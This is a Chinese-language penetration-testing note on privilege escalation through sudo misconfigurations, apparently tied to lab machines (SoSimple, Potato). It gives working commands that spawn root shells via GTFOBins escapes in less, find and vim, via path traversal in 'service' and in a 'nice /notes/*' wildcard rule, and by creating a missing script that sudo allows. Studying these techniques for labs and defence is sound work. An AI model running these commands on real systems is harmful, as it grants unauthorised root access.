# Sudo 權限配置錯誤與利用 (sudo-l)
本文件說明如何利用 `sudo -l` (Sudoers 檔) 的配置錯誤進行本地權限提升（Privilege Escalation）。

---

## 🔍 Sudo 配合 GTFOBins 逃逸利用
GTFOBins 是一個精心策劃的 Unix 二進制檔案列表，這些檔案可用於繞過配置錯誤系統中的本地安全限制。
當普通使用者被賦予了 `sudo` 特權（可由 `sudo -l` 檢出），如果該指令被列在 GTFOBins 中，通常可以利用該工具內建的互動功能（如讀取檔案、呼叫 Shell、執行 Python/Perl 腳本等）來逃逸當前環境，直接取得目標使用者或 `root` 的權限。

### 🛠️ 常見二進制檔案 Sudo 逃逸範例

*   **Less / More**：
    ```bash
    sudo less /etc/profile
    # 在 less 介面中輸入 !/bin/sh 即可取得 shell
    ```
*   **Find**：
    ```bash
    sudo find . -exec /bin/sh \; -quit
    ```
*   **Vim**：
    ```bash
    sudo vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
    ```

---

## 💥 Sudo Service 提權
當使用者被授權可以免密碼以其他使用者（或 `root`）權限執行 `/usr/sbin/service` 命令時，可以利用 GTFOBins 逃逸技巧，執行相對路徑引導至互動式 Shell。

*   **漏洞檢測**：
    ```bash
    sudo -l
    # 輸出中包含：(username) NOPASSWD: /usr/sbin/service
    ```
*   **利用指令**：
    ```bash
    sudo -u <username> /usr/sbin/service ../../bin/bash
    
    # 或是直接提權為 root
    sudo /usr/sbin/service ../../bin/sh
    ```
    這會繞過 `service` 原本的監控機制，直接以目標使用者身份產出一個互動式 Shell。

---

## 💥 不存在腳本路徑的 Sudo 提權
當系統的 `sudoers` 檔案授權某個使用者可以免密碼以 `root` 執行某個腳本，但是該腳本所指的目錄或檔案目前**並不存在**於系統中。如果普通使用者對該腳本的父目錄擁有寫入權限，即可自行建立該腳本以執行任意代碼。

*   **漏洞檢測**：
    ```bash
    sudo -l
    # 輸出中包含：(root) NOPASSWD: /opt/tools/server-health.sh
    ```
    如果 `/opt/tools/server-health.sh` 不存在，且使用者可寫入 `/opt/`。
*   **利用指令**：
    1.  **建立缺失的目錄與腳本**：
        ```bash
        mkdir -p /opt/tools
        echo -e '#!/bin/bash\n/bin/bash -p' > /opt/tools/server-health.sh
        chmod +x /opt/tools/server-health.sh
        ```
    2.  **以 Root 執行 Sudo 提權**：
        ```bash
        sudo /opt/tools/server-health.sh
        ```
        系統執行該腳本後即可成功取得具備 `root` 權限的 Shell。

---

## 💥 Sudo 萬用字元與路徑走訪繞過 (Sudo Wildcard Path Traversal)
當 Sudoers 檔案中限制了執行命令的參數必須在某個指定目錄下（例如使用萬用字元 `/notes/*`），如果系統的 Sudo 機制或執行的二進制檔案本身未對路徑走訪字元 `..` 進行限制，攻擊者可以使用相對路徑 `../` 來繞過限制，執行該指定目錄外的任意指令。

*   **漏洞檢測**：
    ```bash
    sudo -l
    # 輸出中包含：(ALL : ALL) /bin/nice /notes/*
    ```
*   **利用指令**：
    1.  **直接執行目標 Shell**（如果命令如 `nice` 能直接調用其他二進制）：
        ```bash
        sudo /bin/nice /notes/../bin/bash
        ```
    2.  **寫入並執行自定義腳本**（如果可以直接執行自定義腳本）：
        在普通使用者家目錄下寫入 `shell.sh`：
        ```bash
        echo -e '#!/bin/bash\n/bin/bash -p' > /home/user/shell.sh
        chmod +x /home/user/shell.sh
        ```
        透過 `..` 繞過路徑限制執行該腳本取得 `root` 權限：
        ```bash
        sudo /bin/nice /notes/../home/user/shell.sh
        ```

---

# 實戰關聯
*   **靶機應用實例**：
    *   [[SoSimple]]（利用 `sudo -u steven service ../../bin/bash` 切換使用者；隨後利用不存在的 `/opt/tools/server-health.sh` 腳本取得 `root` 權限）。
    *   [[Potato]]（利用 Sudo 權限 `(ALL : ALL) /bin/nice /notes/*` 中的萬用字元與路徑走訪漏洞，執行 `sudo /bin/nice /notes/../bin/bash` 或呼叫家目錄的可執行腳本提權至 `root`）。
